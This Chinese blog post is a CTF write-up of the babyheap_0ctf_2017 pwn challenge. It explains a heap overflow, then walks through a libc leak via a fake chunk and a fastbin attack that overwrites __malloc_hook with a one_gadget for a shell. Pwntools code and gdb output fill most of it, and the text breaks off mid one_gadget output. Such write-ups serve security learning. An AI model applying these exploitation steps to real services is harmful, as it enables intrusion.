<!DOCTYPE html>
<html>
  <head><meta name="generator" content="Hexo 3.9.0">
    
    <meta charset="utf-8">
    <meta name="baidu-site-verification" content="vvVgSQUzPU">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="undefined">
     
    <meta name="description" content="null">
    
    <title>
      babyheap_0ctf_2017 - ios&#39;s blog
    </title>
    <link rel="manifest" href="/manifest.json">
    <link rel="shortcut icon" href="undefined" type="image/x-icon">
    <link rel="stylesheet" href="/style/style.css">
  </head>
  <body>
    <div id="fixed-menu">
      <span class="iconfont icon-arrowup"></span>
    </div>
    <div id="progress">
      <div class="line"></div>
    </div>
    <!-- <div id="search-wrap">
      <input type="text" placeholder="Search Keys"/>

      <div class="result"></div>
    </div> -->
    <div id="head">
      
      <a href="/" class="">
        首页
      </a>
      
      <a href="/archives" class="">
        归档
      </a>
      
      <a href="/about" class="">
        关于
      </a>
      
      <a href="/link" class="">
        友情链接
      </a>
      
    </div>
    <div id="container">
      <div id="main">
        <div class="navbar">
          <div class="toggle">
            <span class="iconfont icon-menu toggle-icon"></span>
          </div>
          <div class="search">
            <div class="input-warp">
              <!-- <span class="iconfont icon-sousuo"></span> -->
              <input type="text" name="" class="st-default-search-input" id="site-search" placeholder="Search Keys">
            </div>
          </div>
        </div>
        <div class="content">
          <article class="post-entry">
    <div class="header">
      <div class="title">babyheap_0ctf_2017</div>
      <div class="meta">
        <span class="item">
          <span class="iconfont icon-time-circle"></span>
          <span>2019/09/13</span>
        </span>

        
        
         
          <span class="item">
            <span class="iconfont icon-tag1"></span>
            <span>
                
                  
                    <a href="/tags/Fastbin_Attack">Fastbin_Attack</a>
                  
                
                  
                    <a href="/tags/Heap">Heap</a>
                  
                
                  
                    <a href="/tags/做题笔记">做题笔记</a>
                  
                
            </span>
          </span>
         

        
          <span class="item leancloud-visitors" id="/2019/09/13/babyheap-0ctf-2017/" data-flag-title="babyheap_0ctf_2017">
            <span class="iconfont icon-eye1"></span>
            <span class="leancloud-visitors-count"></span>
          </span>
        
      </div>
      <div>
      </div>
    </div>
    <p>新的开始、只记录遇到题目的问题以及解决方法。</p>
<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>通过分析源码可以知道</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">sub_E7F</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  result <span class="token operator">=</span> <span class="token function">sub_138C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//read</span>
  v2 <span class="token operator">=</span> result<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>result <span class="token operator">&amp;</span> <span class="token number">0x80000000</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0LL</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>result <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    result <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>result <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>result <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      result <span class="token operator">=</span> <span class="token function">sub_138C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      v3 <span class="token operator">=</span> result<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>result <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        result <span class="token operator">=</span> <span class="token function">sub_11B2</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24LL</span> <span class="token operator">*</span> v2 <span class="token operator">+</span> a1 <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>先读入idx、判断idx是否创建，如果创建则提示输入size。</p>
<p>判断输入的size是否大于0 但是没有和当前idx的size做比较导致，这里的size可控，可以写入比申请chunk时更大的size。</p>
<p>content的输入大小和当前输入的size同大小。</p>
<p>所以这里存在堆溢出。可以覆盖数据到其他堆块。</p>
<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/APwn/buuctf/babyheap_0ctf_2017'</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre>
<p>​    开启了PIE</p>
<p>需要leak libc_base</p>
<h2 id="Leak-Libc-base"><a href="#Leak-Libc-base" class="headerlink" title="Leak Libc_base"></a>Leak Libc_base</h2><p>因为存在堆溢出 可以通过溢出伪造一个fake_small_chunk，接着申请一个smallchuank，利用fake_small_chunk 包含smallchuank头部以及fd bk ，利用dump函数即可获取main_arena地址</p>
<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">Allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx=0</span>
Allocate<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx=1</span>
</code></pre>
<p>通过Fill溢出chunk0 修改fastbin chunk1 的size为small chunk size  </p>
<p>包含chunk head size =0x71 ，chunk大小=0x60</p>
<p>修改前堆块分布</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gdb-peda$ heap
0x558240ff2000 FASTBIN <span class="token punctuation">{</span>
  prev_size <span class="token operator">=</span> 0x0, 
  size <span class="token operator">=</span> 0x71, 
  fd <span class="token operator">=</span> 0x0, 
  bk <span class="token operator">=</span> 0x0, 
  fd_nextsize <span class="token operator">=</span> 0x0, 
  bk_nextsize <span class="token operator">=</span> 0x0
<span class="token punctuation">}</span>
0x558240ff2070 FASTBIN <span class="token punctuation">{</span>
  prev_size <span class="token operator">=</span> 0x0, 
  size <span class="token operator">=</span> 0x41, //修改前size（包含chunk head）
  fd <span class="token operator">=</span> 0x0, 
  bk <span class="token operator">=</span> 0x0, 
  fd_nextsize <span class="token operator">=</span> 0x0, 
  bk_nextsize <span class="token operator">=</span> 0x0
<span class="token punctuation">}</span>
0x558240ff20b0 PREV_INUSE <span class="token punctuation">{</span>
  prev_size <span class="token operator">=</span> 0x0, 
  size <span class="token operator">=</span> 0x20f51, 
  fd <span class="token operator">=</span> 0x0, 
  bk <span class="token operator">=</span> 0x0, 
  fd_nextsize <span class="token operator">=</span> 0x0, 
  bk_nextsize <span class="token operator">=</span> 0x0
<span class="token punctuation">}</span>
</code></pre>
<p>修改后堆块分布</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">Fill<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<pre class=" language-bash"><code class="language-bash">gdb-peda$ heap
0x557fb7f39000 FASTBIN <span class="token punctuation">{</span>
  prev_size <span class="token operator">=</span> 0x0, 
  size <span class="token operator">=</span> 0x71, 
  fd <span class="token operator">=</span> 0x6161616161616161, 
  bk <span class="token operator">=</span> 0x6161616161616161, 
  fd_nextsize <span class="token operator">=</span> 0x6161616161616161, 
  bk_nextsize <span class="token operator">=</span> 0x6161616161616161
<span class="token punctuation">}</span>
0x557fb7f39070 FASTBIN <span class="token punctuation">{</span>
  prev_size <span class="token operator">=</span> 0x0, 
  size <span class="token operator">=</span> 0x71,  //这里通过溢出上面的chunk 修改了此处的size
  fd <span class="token operator">=</span> 0x0, 
  bk <span class="token operator">=</span> 0x0, 
  fd_nextsize <span class="token operator">=</span> 0x0, 
  bk_nextsize <span class="token operator">=</span> 0x0
<span class="token punctuation">}</span>
0x557fb7f390e0 <span class="token punctuation">{</span>
  prev_size <span class="token operator">=</span> 0x0, 
  size <span class="token operator">=</span> 0x0, 
  fd <span class="token operator">=</span> 0x0, 
  bk <span class="token operator">=</span> 0x0, 
  fd_nextsize <span class="token operator">=</span> 0x0, 
  bk_nextsize <span class="token operator">=</span> 0x0
<span class="token punctuation">}</span>
gdb-peda$ 
<span class="token operator">&lt;</span>p class<span class="token operator">=</span><span class="token string">"code-caption"</span> data-lang<span class="token operator">=</span><span class="token string">""</span> data-line_number<span class="token operator">=</span><span class="token string">"frontend"</span> data-trim_indent<span class="token operator">=</span><span class="token string">"backend"</span> data-label_position<span class="token operator">=</span><span class="token string">"outer"</span> data-labels_left<span class="token operator">=</span><span class="token string">""</span> data-labels_right<span class="token operator">=</span><span class="token string">""</span> data-labels_copy<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span>span class<span class="token operator">=</span><span class="token string">"code-caption-label"</span><span class="token operator">></span><span class="token operator">&lt;</span>/span<span class="token operator">></span><span class="token operator">&lt;</span>/p<span class="token operator">></span>
</code></pre>
<p>接着申请一块small_chunk 并且为了满足check需求，需要在chunk2 内容做处理，因为chunk1 原本大小为0x41 现在我们修改了大小为0x71 所以还缺少0x30 size。chunk2_head包含了0x10剩下的0x20由chunk2_content补充</p>
<p>我们修改chunk2 内容 前0x20为任意数据 ，补充到fake的chunk1的content里，接着伪造一个prev_size 以及 next_size （过fastbin check）</p>
<p>此处next_size 为了构成fastbin循环链表需要满足等于第一次申请的chunk0 size，所以next_size=chunk0_size =0x71</p>
<pre class=" language-python"><code class="language-python">Allocate<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx=2</span>
Fill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p>伪造好堆块将堆块free掉 使fake chunk成为real chunk，</p>
<p>重新分配fake_chunk_size(0x60)</p>
<p>因为fake_chunk占用了chunk2_head（0x10），占用了chunk2_content(0x20)</p>
<p>所以重新分配时会清空这些部分（calloc特性 分配堆块时 会先清空该chunk）</p>
<p>重新分配，接着因为我们的small_chunk(chunk2)的头部被清空了 所以破坏了原本的堆结构，我们需要通过溢出chunk1(0x40),修改回原chunk2 head 以及size</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">Free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
Allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token operator">//</span>重新申请
Fill<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x111</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">//</span>溢出chunk1 修改chunk2头部信息
</code></pre>
<p>查看当前堆块布局</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gdb-peda$ x/40gx 0x55a7bccd2070
0x55a7bccd2070:    0x0000000000000000    0x0000000000000071  //chunk1
0x55a7bccd2080:    0x6161616161616161    0x6161616161616161
0x55a7bccd2090:    0x6161616161616161    0x6161616161616161
0x55a7bccd20a0:    0x6161616161616161    0x6161616161616161
0x55a7bccd20b0:    0x0000000000000000    0x0000000000000111  //chunk2
0x55a7bccd20c0:    0x0000000000000000    0x0000000000000000
0x55a7bccd20d0:    0x0000000000000000    0x0000000000000000
0x55a7bccd20e0:    0x0000000000000000    0x0000000000000071  
0x55a7bccd20f0:    0x0000000000000000    0x0000000000000000
0x55a7bccd2100:    0x0000000000000000    0x0000000000000000
0x55a7bccd2110:    0x0000000000000000    0x0000000000000000
0x55a7bccd2120:    0x0000000000000000    0x0000000000000000
0x55a7bccd2130:    0x0000000000000000    0x0000000000000000
0x55a7bccd2140:    0x0000000000000000    0x0000000000000000
0x55a7bccd2150:    0x0000000000000000    0x0000000000000000
0x55a7bccd2160:    0x0000000000000000    0x0000000000000000
0x55a7bccd2170:    0x0000000000000000    0x0000000000000000
0x55a7bccd2180:    0x0000000000000000    0x0000000000000000
0x55a7bccd2190:    0x0000000000000000    0x0000000000000000
0x55a7bccd21a0:    0x0000000000000000    0x0000000000000000
</code></pre>
<p>根据small_bin特性，只存在一块时，free掉时指向top_chunk =&gt; main_arena+0x58处</p>
<p>所以尝试利用Free函数free掉该small_chunk（chunk2）</p>
<p>注意：free chunk2时需要再申请一个chunk （方式与top chunk 合并）</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">Allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span> <span class="token operator">//</span>防止合并
Free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
</code></pre>
<p>查看当前堆布局</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gdb-peda$ bins 
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x55bca862b0b0 —▸ 0x7fd682405b78 <span class="token punctuation">(</span>main_arena+88<span class="token punctuation">)</span> ◂— 0x55bca862b0b0
smallbins
empty
largebins
empty
gdb-peda$ x/20gx 0x55bca862b070
0x55bca862b070:    0x0000000000000000    0x0000000000000071 chunk1
0x55bca862b080:    0x6161616161616161    0x6161616161616161
0x55bca862b090:    0x6161616161616161    0x6161616161616161
0x55bca862b0a0:    0x6161616161616161    0x6161616161616161
0x55bca862b0b0:    0x0000000000000000    0x0000000000000111//chunk2
0x55bca862b0c0:    0x00007fd682405b78    0x00007fd682405b78
0x55bca862b0d0:    0x0000000000000000    0x0000000000000000
0x55bca862b0e0:    0x0000000000000000    0x0000000000000071
0x55bca862b0f0:    0x0000000000000000    0x0000000000000000
0x55bca862b100:    0x0000000000000000    0x0000000000000000
gdb-peda$
</code></pre>
<p>可以看到当前chunk2 分fd bk 都指向main_arena+88处 </p>
<p>接着打印当前fake_chunk1  由于fake_chunk原大小为0x30 所以dump fake_chunk时会打印出chunk2 head 、chunk2 size、chunk2 fd bk 。</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">print</span> Dump<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#print hexDump(1)[:-8]</span>
leak <span class="token operator">=</span> u64<span class="token punctuation">(</span>Dump<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">25</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x58</span>
<span class="token keyword">print</span> <span class="token string">"leak:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>leak<span class="token punctuation">)</span>
</code></pre>
<pre class=" language-bash"><code class="language-bash">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x00\x00\x00\x00\x11\x00\x00\x00x��<span class="token punctuation">[</span>\\x7f\x00x��<span class="token punctuation">[</span>\\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00

<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x2 bytes:
    <span class="token string">'4\n'</span>
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x7 bytes:
    <span class="token string">'Index: '</span>
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x2 bytes:
    <span class="token string">'1\n'</span>
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0xa0 bytes:
    00000000  43 6f 6e 74  65 6e 74 3a  20 0a 61 61  61 61 61 61  │Cont│ent:│ ·aa│aaaa│
    00000010  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000030  61 61 61 61  61 61 61 61  61 61 00 00  00 00 00 00  │aaaa│aaaa│aa··│····│
    00000040  00 00 11 01  00 00 00 00  00 00 78 db  ea 5b 5c 7f  │····│····│··x·│·<span class="token punctuation">[</span>\·│
    00000050  00 00 78 db  ea 5b 5c 7f  00 00 00 00  00 00 00 00  │··x·│·<span class="token punctuation">[</span>\·│····│····│
    00000060  00 00 00 00  00 00 00 00  00 00 0a 31  2e 20 41 6c  │····│····│···1│. Al│
    00000070  6c 6f 63 61  74 65 0a 32  2e 20 46 69  6c 6c 0a 33  │loca│te·2│. Fi│ll·3│
    00000080  2e 20 46 72  65 65 0a 34  2e 20 44 75  6d 70 0a 35  │. Fr│ee·4│. Du│mp·5│
    00000090  2e 20 45 78  69 74 0a 43  6f 6d 6d 61  6e 64 3a 20  │. Ex│it·C│omma│nd: │
    000000a0
leak:0x7f5c5beadb20
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Stopped process <span class="token string">'./babyheap_0ctf_2017'</span> <span class="token punctuation">(</span>pid 119678<span class="token punctuation">)</span>
<span class="token operator">&lt;</span>p class<span class="token operator">=</span><span class="token string">"code-caption"</span> data-lang<span class="token operator">=</span><span class="token string">""</span> data-line_number<span class="token operator">=</span><span class="token string">"frontend"</span> data-trim_indent<span class="token operator">=</span><span class="token string">"backend"</span> data-label_position<span class="token operator">=</span><span class="token string">"outer"</span> data-labels_left<span class="token operator">=</span><span class="token string">""</span> data-labels_right<span class="token operator">=</span><span class="token string">""</span> data-labels_copy<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span>span class<span class="token operator">=</span><span class="token string">"code-caption-label"</span><span class="token operator">></span><span class="token operator">&lt;</span>/span<span class="token operator">></span><span class="token operator">&lt;</span>/p<span class="token operator">></span>
</code></pre>
<p>可以看到成功打印出main_arena+88地址</p>
<h3 id="获取libc-base"><a href="#获取libc-base" class="headerlink" title="获取libc base"></a>获取libc base</h3><p>利用工具</p>
<p><a href="https://github.com/bash-c/main_arena_offset" target="_blank" rel="noopener">https://github.com/bash-c/main_arena_offset</a></p>
<p>可以快速获取当前main_arena的offset</p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~/APwn/buuctf$ main_arena /lib/x86_64-linux-gnu/libc.so.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span>libc version <span class="token keyword">:</span> glibc 2.23
<span class="token punctuation">[</span>+<span class="token punctuation">]</span>build ID <span class="token keyword">:</span> BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>1ca54a6e0d76188105b12e49fe6b8019bf08803a
<span class="token punctuation">[</span>+<span class="token punctuation">]</span>main_arena_offset <span class="token keyword">:</span> 0x3c4b20
ios@ubuntu:~/APwn/buuctf$
</code></pre>
<p>从而可以计算出当前libc_base</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">leak <span class="token operator">=</span> u64<span class="token punctuation">(</span>Dump<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">25</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x58</span>
<span class="token keyword">print</span> <span class="token string">"leak:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>leak<span class="token punctuation">)</span>
base<span class="token operator">=</span>leak<span class="token number">-0x3c4b20</span>
</code></pre>
<h2 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h2><p>leak出了libc base ，接着通过 改malloc_hook为one_gadget 即可成功getshell</p>
<p>找到malloc_hook 地址，寻找满足fastbin 对齐检查的fake chunk addr ，计算malloc_hook距离该fake chunk addr的offset 。溢出chunk0 修改 chunk1的fd指向该fake chunk addr 多次申请堆块 成功在此处申请到chunk。</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gdb-peda$ p <span class="token punctuation">(</span>void*<span class="token punctuation">)</span><span class="token operator">&amp;</span>main_arena
<span class="token variable">$1</span> <span class="token operator">=</span> <span class="token punctuation">(</span>void *<span class="token punctuation">)</span> 0x7f406f115b20 <span class="token operator">&lt;</span>main_arena<span class="token operator">></span>
gdb-peda$ x/20gx 0x7f406f115b20-0x10
0x7f406f115b10 <span class="token operator">&lt;</span>__malloc_hook<span class="token operator">></span>:    0x0000000000000000    0x0000000000000000
0x7f406f115b20 <span class="token operator">&lt;</span>main_arena<span class="token operator">></span>:    0x0000000000000000    0x0000000000000000
0x7f406f115b30 <span class="token operator">&lt;</span>main_arena+16<span class="token operator">></span>:    0x0000000000000000    0x0000000000000000
0x7f406f115b40 <span class="token operator">&lt;</span>main_arena+32<span class="token operator">></span>:    0x0000000000000000    0x0000000000000000
0x7f406f115b50 <span class="token operator">&lt;</span>main_arena+48<span class="token operator">></span>:    0x0000000000000000    0x0000000000000000
0x7f406f115b60 <span class="token operator">&lt;</span>main_arena+64<span class="token operator">></span>:    0x0000000000000000    0x0000000000000000
0x7f406f115b70 <span class="token operator">&lt;</span>main_arena+80<span class="token operator">></span>:    0x0000000000000000    0x000056350ef5f230
0x7f406f115b80 <span class="token operator">&lt;</span>main_arena+96<span class="token operator">></span>:    0x0000000000000000    0x000056350ef5f0b0
0x7f406f115b90 <span class="token operator">&lt;</span>main_arena+112<span class="token operator">></span>:    0x000056350ef5f0b0    0x00007f406f115b88
0x7f406f115ba0 <span class="token operator">&lt;</span>main_arena+128<span class="token operator">></span>:    0x00007f406f115b88    0x00007f406f115b98
gdb-peda$ find_fake_fast 0x7f406f115b10 0x7f
FAKE CHUNKS
0x7f406f115aed FAKE PREV_INUSE IS_MMAPED NON_MAIN_ARENA <span class="token punctuation">{</span>
  prev_size <span class="token operator">=</span> 0x406f114260000000, 
  size <span class="token operator">=</span> 0x7f, 
  fd <span class="token operator">=</span> 0x406edd6e20000000, 
  bk <span class="token operator">=</span> 0x406edd6a0000007f, 
  fd_nextsize <span class="token operator">=</span> 0x7f, 
  bk_nextsize <span class="token operator">=</span> 0x0
<span class="token punctuation">}</span>
gdb-peda$
</code></pre>
<p>计算fake chunk addr 距离malloc_hook 的offset</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gdb-peda$ p/x 0x7f406f115b10-0x7f406f115aed
<span class="token variable">$2</span> <span class="token operator">=</span> 0x23
</code></pre>
<pre class=" language-python"><code class="language-python">malloc_hook<span class="token operator">=</span>base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span>
Free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
Fill<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token number">-0x23</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

Allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx</span>
Allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx</span>
<span class="token operator">&lt;</span>p <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"code-caption"</span> data<span class="token operator">-</span>lang<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>line_number<span class="token operator">=</span><span class="token string">"frontend"</span> data<span class="token operator">-</span>trim_indent<span class="token operator">=</span><span class="token string">"backend"</span> data<span class="token operator">-</span>label_position<span class="token operator">=</span><span class="token string">"outer"</span> data<span class="token operator">-</span>labels_left<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>labels_right<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>labels_copy<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span>span <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"code-caption-label"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
</code></pre>
<p>获取onegadget</p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~/APwn/buuctf$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
0x45216 execve<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span>, rsp+0x30, environ<span class="token punctuation">)</span>
constraints:
  rax <span class="token operator">==</span> NULL

0x4526a execve<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span>, rsp+0x30, environ<span class="token punctuation">)</span>
constraints:
  <span class="token punctuation">[</span>rsp+0x30<span class="token punctuation">]</span> <span class="token operator">==</span> NULL

0xf02a4 execve<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span>, rsp+0x50, environ<span class="token punctuation">)</span>
constraints:
